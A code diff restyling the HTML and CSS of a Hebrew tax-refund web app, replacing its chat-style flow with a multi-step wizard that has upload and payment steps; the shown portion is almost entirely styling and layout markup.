@@ -3,13 +3,13 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>מיסה – החזר מס אוטומטי</title>
+  <title>מיסה — אשף החזרי מס</title>
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Heebo:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet" />
   <style>
-    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-    html, body { height: 100%; margin: 0; padding: 0; }
+    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0; padding: 0; }
+    html, body { height: 100%; }
     body {
       font-family: 'Heebo', sans-serif;
       background: #060b14;
@@ -27,19 +27,18 @@
       position: relative;
       display: flex;
       flex-direction: column;
-      box-shadow: 0 0 80px rgba(0, 0, 0, 0.6);
+      box-shadow: 0 0 80px rgba(0,0,0,0.6);
       overflow: hidden;
     }
-    /* subtle radial glow behind main container */
     #app::before {
       content: '';
       position: absolute;
-      top: -30%;
+      top: -20%;
       left: 50%;
       transform: translateX(-50%);
       width: 500px;
       height: 500px;
-      background: radial-gradient(circle, rgba(212, 175, 55, 0.04) 0%, transparent 70%);
+      background: radial-gradient(circle, rgba(212,175,55,0.05) 0%, transparent 70%);
       pointer-events: none;
       z-index: 0;
     }
@@ -47,18 +46,18 @@
     /* ─── Header ─── */
     .app-header {
       background: linear-gradient(180deg, #0F172A 0%, #0B0F19 100%);
-      padding: 20px 22px 14px;
+      padding: 18px 22px 12px;
       color: #fff;
       flex-shrink: 0;
       position: relative;
       z-index: 10;
-      border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+      border-bottom: 1px solid rgba(255,255,255,0.04);
     }
     .app-header .top-row {
       display: flex;
       align-items: center;
       justify-content: space-between;
-      margin-bottom: 12px;
+      margin-bottom: 10px;
     }
     .app-header .logo {
       display: flex;
@@ -66,628 +65,246 @@
       gap: 10px;
       font-weight: 800;
       font-size: 22px;
-      letter-spacing: -0.3px;
       color: #fff;
     }
     .app-header .logo-icon {
-      width: 36px;
-      height: 36px;
+      width: 36px; height: 36px;
       background: linear-gradient(135deg, #D4AF37, #C5A880);
       border-radius: 10px;
       display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 16px;
-      font-weight: 900;
-      color: #0B0F19;
+      align-items: center; justify-content: center;
+      font-size: 16px; font-weight: 900; color: #0B0F19;
     }
     .app-header .badge {
-      border: 1px solid rgba(212, 175, 55, 0.25);
-      padding: 5px 14px;
-      border-radius: 20px;
-      font-size: 12px;
-      font-weight: 600;
-      display: flex;
-      align-items: center;
-      gap: 6px;
+      border: 1px solid rgba(212,175,55,0.25);
+      padding: 5px 14px; border-radius: 20px;
+      font-size: 12px; font-weight: 600;
+      display: flex; align-items: center; gap: 6px;
       color: #D4AF37;
-      backdrop-filter: blur(4px);
     }
-    .app-header .badge .dot {
-      width: 6px;
-      height: 6px;
-      background: #D4AF37;
-      border-radius: 50%;
-      display: inline-block;
-      animation: pulse-dot 2s infinite;
-    }
-    @keyframes pulse-dot {
-      0%, 100% { opacity: 1; transform: scale(1); }
-      50% { opacity: 0.4; transform: scale(0.8); }
-    }
-
-    /* ─── Refund Counter ─── */
     .refund-counter {
-      background: linear-gradient(135deg, rgba(212, 175, 55, 0.08) 0%, rgba(212, 175, 55, 0.02) 100%);
-      border: 1px solid rgba(212, 175, 55, 0.12);
-      border-radius: 14px;
-      padding: 14px 18px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      color: #fff;
-      margin-top: 2px;
+      background: linear-gradient(135deg, rgba(212,175,55,0.08) 0%, rgba(212,175,55,0.02) 100%);
+      border: 1px solid rgba(212,175,55,0.12);
+      border-radius: 12px; padding: 12px 16px;
+      display: flex; align-items: center; justify-content: space-between;
+      color: #fff; margin-top: 2px;
     }
-    .refund-counter .label {
-      font-size: 13px;
-      font-weight: 600;
-      color: #94A3B8;
-    }
+    .refund-counter .label { font-size: 12px; font-weight: 500; color: #94A3B8; }
     .refund-counter .amount {
-      font-size: 28px;
-      font-weight: 900;
-      line-height: 1;
-      direction: ltr;
-      display: flex;
-      align-items: center;
-      gap: 2px;
-      color: #D4AF37;
+      font-size: 26px; font-weight: 900; line-height: 1;
+      direction: ltr; display: flex; align-items: center; gap: 2px; color: #D4AF37;
     }
-    .refund-counter .amount .currency {
-      font-size: 18px;
-      font-weight: 700;
-      margin-left: 2px;
-    }
-    .refund-counter .amount .num {
-      display: inline-block;
-      min-width: 80px;
-      text-align: left;
-    }
-    .refund-counter .zero-risk {
-      font-size: 11px;
-      font-weight: 500;
-      background: rgba(212, 175, 55, 0.1);
-      padding: 3px 10px;
-      border-radius: 10px;
-      white-space: nowrap;
-      color: #D4AF37;
-    }
+    .refund-counter .amount .currency { font-size: 16px; font-weight: 700; margin-left: 2px; }
+    .refund-counter .amount .num { display: inline-block; min-width: 70px; text-align: left; }
 
-    /* ─── Progress Bar ─── */
-    .progress-section {
-      padding: 14px 22px 6px;
-      flex-shrink: 0;
-      position: relative;
-      z-index: 5;
+    /* ─── Wizard Container ─── */
+    .wizard {
+      flex: 1; display: flex; flex-direction: column;
+      position: relative; z-index: 2; padding: 0;
     }
-    .progress-bar-track {
-      width: 100%;
-      height: 4px;
-      background: rgba(255, 255, 255, 0.06);
-      border-radius: 10px;
-      overflow: hidden;
+    .wizard-header {
+      padding: 16px 22px 6px; flex-shrink: 0;
     }
-    .progress-bar-fill {
-      height: 100%;
-      width: 0%;
+    .wizard-header .step-label {
+      font-size: 12px; font-weight: 600; color: rgba(148,163,184,0.5);
+      margin-bottom: 8px; display: flex; justify-content: space-between;
+    }
+    .wizard-header .step-label .current { color: #D4AF37; }
+    .wizard-progress {
+      width: 100%; height: 3px;
+      background: rgba(255,255,255,0.05); border-radius: 10px; overflow: hidden;
+    }
+    .wizard-progress .fill {
+      height: 100%; width: 0%;
       background: linear-gradient(90deg, #D4AF37, #C5A880);
       border-radius: 10px;
-      transition: width 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
-    }
-    .progress-labels {
-      display: flex;
-      justify-content: space-between;
-      margin-top: 6px;
-      font-size: 11px;
-      color: rgba(148, 163, 184, 0.5);
-      font-weight: 500;
-    }
-    .progress-labels .step.active {
-      color: #D4AF37;
-      font-weight: 700;
+      transition: width 0.6s cubic-bezier(0.34,1.56,0.64,1);
     }
 
-    /* ─── Chat Area ─── */
-    .chat-area {
-      flex: 1;
+    /* ─── Wizard Track (sliding steps) ─── */
+    .wizard-body {
+      flex: 1; overflow: hidden; position: relative;
+      display: flex;
+    }
+    .wizard-track {
+      display: flex;
+      transition: transform 0.55s cubic-bezier(0.4,0,0.2,1);
+      width: 100%;
+    }
+    .wizard-step {
+      flex: 0 0 100%; min-width: 0;
+      display: flex; flex-direction: column;
+      padding: 20px 24px 24px;
       overflow-y: auto;
-      padding: 16px 20px 10px;
-      display: flex;
-      flex-direction: column;
-      gap: 14px;
-      scroll-behavior: smooth;
-      position: relative;
-      z-index: 2;
     }
-    .chat-area::-webkit-scrollbar { width: 3px; }
-    .chat-area::-webkit-scrollbar-thumb { background: rgba(212, 175, 55, 0.2); border-radius: 10px; }
+    .wizard-step::-webkit-scrollbar { width: 3px; }
+    .wizard-step::-webkit-scrollbar-thumb { background: rgba(212,175,55,0.15); border-radius: 10px; }
 
-    /* ─── Bubbles ─── */
-    .bubble {
-      max-width: 88%;
-      padding: 14px 20px;
-      border-radius: 16px;
-      font-size: 15px;
-      line-height: 1.7;
-      animation: fadeUp 0.5s ease forwards;
-      opacity: 0;
-      transform: translateY(12px);
-      word-wrap: break-word;
+    /* Step inner elements */
+    .step-title {
+      font-size: 20px; font-weight: 800; color: #fff;
+      line-height: 1.4; margin-bottom: 4px;
     }
-    @keyframes fadeUp {
-      to { opacity: 1; transform: translateY(0); }
+    .step-sub {
+      font-size: 14px; color: #64748B;
+      line-height: 1.6; margin-bottom: 20px;
     }
-    .bubble.bot {
-      align-self: flex-start;
-      background: rgba(255, 255, 255, 0.04);
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      color: #E2E8F0;
-      border-bottom-right-radius: 4px;
-    }
-    .bubble.user {
-      align-self: flex-end;
-      background: linear-gradient(135deg, rgba(212, 175, 55, 0.15) 0%, rgba(212, 175, 55, 0.05) 100%);
-      border: 1px solid rgba(212, 175, 55, 0.15);
-      color: #fff;
-      border-bottom-left-radius: 4px;
-    }
-    .bubble.system {
-      align-self: center;
-      background: rgba(212, 175, 55, 0.04);
-      border: 1px solid rgba(212, 175, 55, 0.08);
-      color: #D4AF37;
-      font-size: 13px;
-      font-weight: 500;
-      text-align: center;
-      max-width: 95%;
-      border-radius: 12px;
-    }
-    .bubble .typing-dots {
-      display: flex;
-      gap: 5px;
-      padding: 4px 0;
-    }
-    .bubble .typing-dots span {
-      width: 8px;
-      height: 8px;
-      background: rgba(212, 175, 55, 0.5);
-      border-radius: 50%;
-      animation: typingBounce 1.4s infinite;
-    }
-    .bubble .typing-dots span:nth-child(2) { animation-delay: 0.2s; }
-    .bubble .typing-dots span:nth-child(3) { animation-delay: 0.4s; }
-    @keyframes typingBounce {
-      0%, 60%, 100% { transform: translateY(0); }
-      30% { transform: translateY(-8px); }
-    }
+    .step-sub strong { color: #94A3B8; }
 
-    /* ─── Question Buttons ─── */
-    .options-container {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 8px;
-      align-self: flex-start;
-      max-width: 95%;
-      animation: fadeUp 0.5s ease forwards;
-      opacity: 0;
-      transform: translateY(12px);
-      margin-top: -4px;
-    }
-    .option-btn {
-      background: rgba(255, 255, 255, 0.03);
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      padding: 10px 22px;
-      border-radius: 50px;
-      font-size: 15px;
-      font-weight: 600;
-      color: #E2E8F0;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      font-family: inherit;
-      flex: 1 1 auto;
-      min-width: 70px;
-      text-align: center;
-      touch-action: manipulation;
-    }
-    .option-btn:hover {
-      border-color: rgba(212, 175, 55, 0.3);
-      background: rgba(212, 175, 55, 0.08);
-    }
-    .option-btn:active { transform: scale(0.96); }
-    .option-btn.selected {
-      border-color: #D4AF37;
-      background: rgba(212, 175, 55, 0.15);
-      color: #D4AF37;
-      box-shadow: 0 4px 20px rgba(212, 175, 55, 0.15);
-    }
-
-    /* ─── Input Area ─── */
-    .input-area {
-      flex-shrink: 0;
-      padding: 14px 20px 20px;
-      border-top: 1px solid rgba(255, 255, 255, 0.04);
-      position: relative;
-      z-index: 5;
-    }
-    .input-area .lead-form {
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-      animation: fadeUp 0.5s ease forwards;
-    }
-    .input-area .lead-form input {
-      width: 100%;
-      padding: 14px 18px;
-      background: rgba(255, 255, 255, 0.03);
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      border-radius: 12px;
-      font-size: 15px;
-      font-family: inherit;
-      text-align: right;
-      direction: rtl;
-      outline: none;
-      transition: border 0.25s ease;
-      color: #fff;
-    }
-    .input-area .lead-form input::placeholder { color: rgba(148, 163, 184, 0.4); }
-    .input-area .lead-form input:focus {
-      border-color: rgba(212, 175, 55, 0.3);
-    }
-    .submit-btn {
-      background: linear-gradient(135deg, #D4AF37 0%, #C5A880 100%);
-      color: #0B0F19;
-      border: none;
-      padding: 16px 28px;
-      border-radius: 12px;
-      font-size: 17px;
-      font-weight: 800;
-      cursor: pointer;
-      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-      font-family: inherit;
-      box-shadow: 0 6px 24px rgba(212, 175, 55, 0.2);
-      width: 100%;
-      letter-spacing: 0.3px;
-      position: relative;
-      overflow: hidden;
-    }
-    .submit-btn:hover {
-      background: linear-gradient(135deg, #C5A880 0%, #B8993E 100%);
-      box-shadow: 0 8px 32px rgba(212, 175, 55, 0.3);
-      transform: translateY(-1px);
-    }
-    .submit-btn:active {
-      transform: scale(0.97);
-      box-shadow: 0 3px 16px rgba(212, 175, 55, 0.15);
-    }
-    .submit-btn:disabled {
-      opacity: 0.4;
-      cursor: not-allowed;
-      transform: none;
-      box-shadow: none;
-    }
-    .submit-btn.gold-outline {
-      background: transparent;
-      border: 1px solid rgba(212, 175, 55, 0.3);
-      color: #D4AF37;
-      box-shadow: none;
-    }
-    .submit-btn.gold-outline:hover {
-      background: rgba(212, 175, 55, 0.06);
-      box-shadow: none;
-    }
-    .skip-btn {
-      background: rgba(255, 255, 255, 0.02);
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      color: #64748B;
-      padding: 10px 20px;
-      border-radius: 12px;
-      font-size: 14px;
-      font-weight: 500;
-      cursor: pointer;
-      transition: all 0.25s ease;
-      font-family: inherit;
-      width: 100%;
-      text-align: center;
-    }
-    .skip-btn:hover {
-      background: rgba(255, 255, 255, 0.04);
-      border-color: rgba(255, 255, 255, 0.1);
-      color: #94A3B8;
-    }
-    .skip-btn:active { transform: scale(0.97); }
-    .input-area .lead-form .disclaimer {
-      font-size: 12px;
-      color: rgba(148, 163, 184, 0.5);
-      text-align: center;
-      line-height: 1.5;
-    }
-    .input-area .lead-form .disclaimer strong {
-      color: #D4AF37;
-    }
-
-    /* ─── Welcome Screen ─── */
-    .welcome-screen {
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      flex: 1;
-      padding: 40px 28px;
-      text-align: center;
-      position: relative;
-      z-index: 2;
-    }
-    .welcome-screen .brand-icon {
-      width: 80px;
-      height: 80px;
-      background: linear-gradient(135deg, rgba(212, 175, 55, 0.12), rgba(212, 175, 55, 0.04));
-      border: 1px solid rgba(212, 175, 55, 0.15);
-      border-radius: 24px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 36px;
-      font-weight: 900;
-      color: #D4AF37;
-      margin-bottom: 18px;
-      animation: float 4s ease-in-out infinite;
-    }
-    @keyframes float {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-6px); }
-    }
-    .welcome-screen h1 {
-      font-size: 26px;
-      font-weight: 900;
-      color: #fff;
-      line-height: 1.5;
-      margin: 0 0 14px;
-    }
-    .welcome-screen h1 .highlight {
-      color: #D4AF37;
-    }
-    .welcome-screen .sub {
-      font-size: 15px;
-      color: #64748B;
-      line-height: 1.7;
-      max-width: 320px;
-      margin: 0 auto 20px;
-    }
-    .welcome-screen .sub strong {
-      color: #94A3B8;
-    }
-    .welcome-screen .usp-grid {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 8px;
-      margin-bottom: 22px;
-    }
-    .welcome-screen .usp-item {
-      background: rgba(255, 255, 255, 0.03);
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      padding: 8px 16px;
-      border-radius: 30px;
-      font-size: 13px;
-      font-weight: 500;
-      color: #94A3B8;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-    .welcome-screen .fee-badge {
-      border: 1px solid rgba(212, 175, 55, 0.2);
-      padding: 10px 28px;
-      border-radius: 50px;
-      font-weight: 800;
-      font-size: 18px;
-      color: #D4AF37;
-      margin-bottom: 22px;
-      background: rgba(212, 175, 55, 0.04);
-    }
-    .welcome-screen .fee-badge small {
-      font-size: 13px;
-      font-weight: 500;
-      color: #94A3B8;
-    }
-    .welcome-btn {
-      background: linear-gradient(135deg, #D4AF37 0%, #C5A880 100%);
-      color: #0B0F19;
-      border: none;
-      padding: 18px 48px;
-      border-radius: 60px;
-      font-size: 20px;
-      font-weight: 800;
-      cursor: pointer;
-      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-      font-family: inherit;
-      box-shadow: 0 8px 32px rgba(212, 175, 55, 0.2);
-      width: 100%;
-      max-width: 300px;
-      letter-spacing: 0.3px;
-      position: relative;
-      overflow: hidden;
-    }
-    .welcome-btn:hover {
-      background: linear-gradient(135deg, #C5A880 0%, #B8993E 100%);
-      box-shadow: 0 12px 48px rgba(212, 175, 55, 0.3);
-      transform: translateY(-2px);
-    }
-    .welcome-btn:active {
-      transform: scale(0.96);
-      box-shadow: 0 4px 20px rgba(212, 175, 55, 0.15);
-    }
-    .welcome-screen .confidence {
-      margin-top: 20px;
-      font-size: 13px;
-      color: rgba(148, 163, 184, 0.4);
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    /* ─── Result Screen ─── */
-    .result-screen {
-      display: none;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      flex: 1;
-      padding: 40px 28px;
-      text-align: center;
-      position: relative;
-      z-index: 2;
-    }
-    .result-screen .result-icon {
-      width: 72px;
-      height: 72px;
-      background: linear-gradient(135deg, rgba(212, 175, 55, 0.1), rgba(212, 175, 55, 0.03));
-      border: 1px solid rgba(212, 175, 55, 0.12);
-      border-radius: 20px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 32px;
-      margin-bottom: 10px;
-    }
-    .result-screen .big-result {
-      font-size: 56px;
-      font-weight: 900;
-      color: #D4AF37;
-      direction: ltr;
-      line-height: 1;
-      margin: 8px 0;
-    }
-    .result-screen .big-result .currency {
-      font-size: 30px;
-    }
-    .result-screen .result-label {
-      font-size: 18px;
-      font-weight: 700;
-      color: #fff;
-      margin-bottom: 4px;
-    }
-    .result-screen .result-sub {
-      font-size: 14px;
-      color: #64748B;
-      max-width: 280px;
-      margin: 0 auto 20px;
-    }
-    .result-screen .fee-note {
-      background: rgba(212, 175, 55, 0.04);
-      border: 1px solid rgba(212, 175, 55, 0.08);
-      padding: 10px 20px;
-      border-radius: 12px;
-      font-size: 14px;
-      font-weight: 500;
-      color: #D4AF37;
-      margin-bottom: 20px;
-    }
-    .result-screen .fee-note strong {
-      color: #fff;
-    }
-    .result-screen .action-group {
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-      width: 100%;
-      max-width: 280px;
-      margin-top: 4px;
-    }
-    .result-screen .action-group .submit-btn {
-      border-radius: 60px;
-      padding: 14px 28px;
-      font-size: 16px;
-    }
-
-    /* ─── Upload / Payment shared ─── */
-    .result-screen .form-card {
-      width: 100%;
-      max-width: 320px;
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-    }
-    .result-screen .form-card input,
-    .result-screen .form-card .file-drop {
-      width: 100%;
-      padding: 14px 18px;
-      background: rgba(255, 255, 255, 0.03);
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      border-radius: 12px;
-      font-size: 15px;
-      font-family: inherit;
-      text-align: right;
-      direction: rtl;
-      outline: none;
+    /* Form inputs */
+    .field-group { display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px; }
+    .field-group input {
+      width: 100%; padding: 16px 18px;
+      background: rgba(255,255,255,0.03);
+      border: 1px solid rgba(255,255,255,0.08);
+      border-radius: 12px; font-size: 16px; font-family: inherit;
+      text-align: right; direction: rtl; outline: none;
       transition: border 0.25s ease, background 0.25s ease;
       color: #fff;
     }
-    .result-screen .form-card input::placeholder { color: rgba(148, 163, 184, 0.35); }
-    .result-screen .form-card input:focus {
-      border-color: rgba(212, 175, 55, 0.3);
-      background: rgba(255, 255, 255, 0.05);
+    .field-group input::placeholder { color: rgba(148,163,184,0.35); }
+    .field-group input:focus {
+      border-color: rgba(212,175,55,0.3);
+      background: rgba(255,255,255,0.05);
     }
-    .result-screen .form-card .file-drop {
-      border-style: dashed;
-      text-align: center;
-      padding: 24px 18px;
-      color: #64748B;
-      cursor: pointer;
-    }
-    .result-screen .form-card .file-drop:hover {
-      border-color: rgba(212, 175, 55, 0.2);
-      background: rgba(212, 175, 55, 0.03);
-    }
-    .result-screen .form-card .row-duo {
-      display: flex;
-      gap: 8px;
-    }
-    .result-screen .form-card .row-duo input {
-      flex: 1;
-      text-align: left;
-      direction: ltr;
-    }
-    .result-screen .form-card .submit-btn {
-      border-radius: 12px;
-      padding: 16px;
-      font-size: 17px;
-    }
-    .result-screen .form-card .skip-btn {
-      margin-top: -2px;
-    }
-    .result-screen .security-badges {
-      display: flex;
-      gap: 10px;
-      margin-top: 14px;
-      flex-wrap: wrap;
-      justify-content: center;
-    }
-    .result-screen .security-badges span {
-      font-size: 11px;
-      color: rgba(148, 163, 184, 0.4);
-      display: flex;
-      align-items: center;
-      gap: 4px;
+    .field-group input.err {
+      border-color: rgba(239,68,68,0.5);
     }
 
-    /* ─── Confetti Canvas ─── */
-    #confetti-canvas {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      pointer-events: none;
-      z-index: 999;
+    /* Option buttons */
+    .option-group { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
+    .option-btn {
+      width: 100%; padding: 16px 20px;
+      background: rgba(255,255,255,0.02);
+      border: 1px solid rgba(255,255,255,0.06);
+      border-radius: 12px; font-size: 16px; font-weight: 600;
+      color: #E2E8F0; cursor: pointer;
+      transition: all 0.3s ease; font-family: inherit;
+      text-align: center; touch-action: manipulation;
+    }
+    .option-btn:hover {
+      border-color: rgba(212,175,55,0.25);
+      background: rgba(212,175,55,0.05);
+    }
+    .option-btn:active { transform: scale(0.98); }
+    .option-btn.selected {
+      border-color: #D4AF37;
+      background: rgba(212,175,55,0.12);
+      color: #D4AF37;
+      box-shadow: 0 0 20px rgba(212,175,55,0.08);
     }
 
-    /* ─── Utility ─── */
+    /* CTA button */
+    .cta-btn {
+      width: 100%; padding: 16px 28px; margin-top: auto;
+      background: linear-gradient(135deg, #D4AF37 0%, #C5A880 100%);
+      color: #0B0F19; border: none; border-radius: 12px;
+      font-size: 17px; font-weight: 800; cursor: pointer;
+      transition: all 0.3s cubic-bezier(0.4,0,0.2,1);
+      font-family: inherit;
+      box-shadow: 0 6px 24px rgba(212,175,55,0.15);
+    }
+    .cta-btn:hover {
+      background: linear-gradient(135deg, #C5A880 0%, #B8993E 100%);
+      box-shadow: 0 8px 32px rgba(212,175,55,0.25);
+      transform: translateY(-1px);
+    }
+    .cta-btn:active { transform: scale(0.97); }
+    .cta-btn:disabled { opacity: 0.35; cursor: not-allowed; transform: none; box-shadow: none; }
+    .cta-btn .sub-label { display: block; font-size: 12px; font-weight: 500; opacity: 0.7; margin-top: 2px; }
+
+    /* Back link */
+    .back-link {
+      text-align: center; margin-top: 14px; font-size: 14px;
+      color: rgba(148,163,184,0.4); cursor: pointer;
+      transition: color 0.2s; font-weight: 500;
+    }
+    .back-link:hover { color: rgba(148,163,184,0.6); }
+
+    /* ─── Upload Step ─── */
+    .upload-area {
+      display: flex; flex-direction: column; gap: 16px; margin-bottom: 16px;
+    }
+    .drop-zone {
+      border: 1px dashed rgba(255,255,255,0.1);
+      border-radius: 14px; padding: 28px 16px;
+      text-align: center; cursor: pointer;
+      transition: border 0.25s ease, background 0.25s ease;
+      background: rgba(255,255,255,0.02);
+    }
+    .drop-zone:hover {
+      border-color: rgba(212,175,55,0.2);
+      background: rgba(212,175,55,0.03);
+    }
+    .drop-zone.has-file {
+      border-color: rgba(212,175,55,0.3);
+      background: rgba(212,175,55,0.04);
+    }
+    .drop-zone .icon { font-size: 28px; margin-bottom: 6px; color: rgba(212,175,55,0.4); }
+    .drop-zone .title { font-size: 14px; font-weight: 600; color: #94A3B8; }
+    .drop-zone .hint { font-size: 11px; color: rgba(148,163,184,0.3); margin-top: 4px; }
+    .drop-zone .file-name { font-size: 12px; color: #D4AF37; margin-top: 6px; font-weight: 600; }
+    .drop-zone.required .icon::after {
+      content: ' *'; color: #EF4444; font-size: 16px;
+    }
+    .drop-zone.required .title::after {
+      content: ' *נדרש'; color: #EF4444; font-size: 11px; margin-right: 4px; font-weight: 400;
+    }
+
+    /* ─── Payment Step ─── */
+    .payment-grid { display: flex; flex-direction: column; gap: 12px; margin-bottom: 16px; }
+    .payment-grid input {
+      width: 100%; padding: 14px 16px;
+      background: rgba(255,255,255,0.03);
+      border: 1px solid rgba(255,255,255,0.08);
+      border-radius: 12px; font-size: 16px; font-family: inherit;
+      outline: none; transition: border 0.25s ease;
+      color: #fff;
+    }
+    .payment-grid input::placeholder { color: rgba(148,163,184,0.35); }
+    .payment-grid input:focus { border-color: rgba(212,175,55,0.3); }
+    .payment-grid input.err { border-color: rgba(239,68,68,0.5); }
+    .payment-grid .row-duo { display: flex; gap: 8px; }
+    .payment-grid .row-duo input { flex: 1; text-align: left; direction: ltr; }
+    .payment-grid .row-duo input:nth-child(2) { flex: 0 0 90px; }
+    .security-badges {
+      display: flex; gap: 12px; justify-content: center;
+      margin-top: 12px; flex-wrap: wrap;
+    }
+    .security-badges span {
+      font-size: 11px; color: rgba(148,163,184,0.35);
+      display: flex; align-items: center; gap: 4px;
+    }
+
+    /* ─── Status messages ─── */
+    .status-msg { font-size: 13px; text-align: center; margin-top: 4px; }
+    .status-msg.err { color: #EF4444; font-weight: 600; }
+    .status-msg.ok { color: #D4AF37; font-weight: 500; }
+    .status-msg.neutral { color: #64748B; }
+
+    /* ─── Success Step ─── */
+    .success-wrap { display: flex; flex-direction: column; align-items: center; justify-content: center; flex: 1; text-align: center; }
+    .success-icon {
+      width: 72px; height: 72px;
+      background: linear-gradient(135deg, rgba(212,175,55,0.1), rgba(212,175,55,0.03));
+      border: 1px solid rgba(212,175,55,0.12);
+      border-radius: 20px; display: flex; align-items: center; justify-content: center;
+      font-size: 32px; color: #D4AF37; margin-bottom: 14px;
+    }
+    .success-title { font-size: 20px; font-weight: 800; color: #fff; margin-bottom: 6px; }
+    .success-sub { font-size: 14px; color: #64748B; max-width: 280px; line-height: 1.6; }
+    .success-sub strong { color: #94A3B8; }
+    .success-note {
+      margin-top: 18px; padding: 10px 20px;
+      background: rgba(212,175,55,0.04);
+      border: 1px solid rgba(212,175,55,0.08);
+      border-radius: 12px; font-size: 13px; color: #D4AF37;
+    }
+
+    /* ─── Confetti ─── */
+    #confetti-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 999; }
+
     .hidden { display: none !important; }
-    .status-msg { font-size: 13px; text-align: center; }
-    .error-msg { color: #EF4444; font-weight: 600; }
-    .success-msg { color: #D4AF37; font-weight: 500; }
-    .neutral-msg { color: #64748B; }
   </style>
 </head>
 <body>
@@ -697,19 +314,12 @@
     <!-- ─── Header ─── -->
     <div class="app-header">
       <div class="top-row">
-        <div class="logo">
-          <span class="logo-icon">מ</span>
-          <span>מיסה</span>
-        </div>
-        <div class="badge">
-          <span class="dot"></span>
-          בדיקה פיננסית
-        </div>
+        <div class="logo"><span class="logo-icon">מ</span>מיסה</div>
+        <div class="badge">אשף החזרי מס</div>
       </div>
-      <div class="refund-counter" id="refundCounter">
+      <div class="refund-counter">
         <div>
           <div class="label">החזר משוער</div>
-          <div class="zero-risk">ללא התחייבות</div>
         </div>
         <div class="amount">
           <span class="currency">₪</span>
@@ -718,292 +328,544 @@
       </div>
     </div>
 
-    <!-- ─── Progress ─── -->
-    <div class="progress-section" id="progressSection">
-      <div class="progress-bar-track">
-        <div class="progress-bar-fill" id="progressFill"></div>
-      </div>
-      <div class="progress-labels">
-        <span class="step" data-step="0">פתיחה</span>
-        <span class="step" data-step="1">תעסוקה</span>
-        <span class="step" data-step="2">הכנסה</span>
-        <span class="step" data-step="3">השכלה</span>
-        <span class="step" data-step="4">בריאות</span>
-        <span class="step" data-step="5">סיכום</span>
-      </div>
-    </div>
+    <!-- ─── Wizard ─── -->
+    <div class="wizard" id="wizard">
 
-    <!-- ─── Welcome ─── -->
-    <div class="welcome-screen" id="welcomeScreen">
-      <div class="brand-icon">מ</div>
-      <h1>
-        ייתכן ואתם זכאים<br>
-        ל<span class="highlight">החזר מס</span> משמעותי<br>
-        מבלי לדעת על כך
-      </h1>
-      <div class="sub">
-        בדיקה פיננסית מקיפה ב-<strong>60 שניות</strong> — ללא עלות וללא התחייבות.<br>
-        עמלת הצלחה של <strong>12%</strong> בלבד, ובתנאי שהכסף התקבל בחשבונכם.
-      </div>
-      <div class="usp-grid">
-        <span class="usp-item">60 שניות</span>
-        <span class="usp-item">ללא עלות</span>
-        <span class="usp-item">מאובטח</span>
-        <span class="usp-item">דיגיטלי</span>
-      </div>
-      <div class="fee-badge">
-        12% עמלה <small>מול 20% בשוק</small>
-      </div>
-      <button class="welcome-btn" id="startBtn">לתחילת הבדיקה</button>
-      <div class="confidence">
-        פרטיכם מאובטחים במערכת מוצפנת
-      </div>
-    </div>
-
-    <!-- ─── Chat ─── -->
-    <div class="chat-area hidden" id="chatArea"></div>
-
-    <!-- ─── Input Area ─── -->
-    <div class="input-area hidden" id="inputArea">
-      <div class="lead-form" id="leadForm">
-        <input type="tel" id="phoneInput" placeholder="טלפון נייד" dir="rtl" inputmode="tel" />
-        <input type="text" id="nameInput" placeholder="שם מלא" dir="rtl" />
-        <button class="submit-btn" id="leadSubmit">קבלת תוצאת הבדיקה</button>
-        <div class="disclaimer">
-          שליחת הפרטים מהווה הסכמה לתנאי השימוש. הפרטים ישמשו אך ורק לצורך בדיקת זכאותכם להחזר מס.
+      <!-- Progress header -->
+      <div class="wizard-header">
+        <div class="step-label">
+          <span>שלב <span id="stepNum">1</span> מתוך <span id="stepTotal">6</span></span>
+          <span id="stepPct" class="current">0%</span>
+        </div>
+        <div class="wizard-progress">
+          <div class="fill" id="progressFill"></div>
         </div>
       </div>
-    </div>
 
-    <!-- ─── Result (after lead submit) ─── -->
-    <div class="result-screen" id="resultScreen">
-      <div class="result-icon">₪</div>
-      <div class="result-label">החזר מס משוער</div>
-      <div class="big-result">
-        <span class="currency">₪</span><span id="finalRefund">0</span>
-      </div>
-      <div class="result-sub">
-        הסכום מבוסס על ניתוח התשובות שהזנתם. נציג מטעמנו יבצע בדיקה מדויקת מול רשות המיסים ויעדכן אתכם.
-      </div>
-      <div class="fee-note">
